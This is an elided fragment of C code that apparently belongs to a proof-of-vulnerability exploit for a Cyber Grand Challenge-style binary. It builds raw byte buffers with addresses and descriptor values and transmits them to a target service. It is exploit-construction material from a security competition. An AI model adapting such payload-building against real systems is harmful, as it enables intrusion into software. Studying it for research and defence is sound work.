...
next_addr:
    ...
    *(unsigned int *)&buf[i] = addr;
    ...
    buf[i++] = chars[1];
    buf[i++] = chars[0];
    __libpov_memcpy(&buf[i], tmp+12, 4);
    i += 4;
    buf[i++] = chars[1];
    buf[i++] = chars[0];
    buf[i++] = chars[4];
    ...
    __libpov_memcpy(buf, "\x07\x01\x00\x00\x00\x00\x05\x04\x04\x84\x00\x01", 12);
    *(unsigned int *)&buf[1] = desc;
    transmit_all(STDOUT, buf, 12);
    desc++;

    __libpov_memcpy(buf, "\x06\x02\x00\x00\x00", 5);
    *(unsigned int *)&buf[1] = desc;
